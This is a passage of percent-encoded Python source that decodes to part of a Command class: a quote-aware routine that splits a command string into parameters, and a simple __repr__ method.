0%20%20%20%20%20%20%20if%20c%20%3D%3D%20%22'%22%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20in_dquote%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%2B%3D%20c%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20in_quote%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20params.append(buf)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%3D%20''%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20in_quote%20%3D%20False%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20len(buf)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%2B%3D%20c%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20in_quote%20%3D%20True%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%3D%20''%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20c%20%3D%3D%20'%22'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20in_dquote%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20params.append(buf)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%3D%20''%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20in_dquote%20%3D%20False%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20in_quote%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%2B%3D%20c%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20len(buf)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%2B%3D%20c%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20in_dquote%20%3D%20True%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%3D%20''%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20c.isspace()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20len(buf)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20in_dquote%20or%20in_quote%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20buf%5B-1%5D.isspace()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%2B%3D%20c%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20params.append(buf)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%3D%20''%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20buf%20%2B%3D%20c%0A%0A%20%20%20%20%20%20%20%20if%20len(buf)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20params.append(buf)%0A%0A%20%20%20%20%20%20%20%20return%20params%0A%0A%20%20%20%20def%20__repr__(self)%3A%0A%20%20%20%20%20%20%20%20return%20%22Command%3C%22%20%2B%20self.command%20%2B%20%22%3E%22%0A
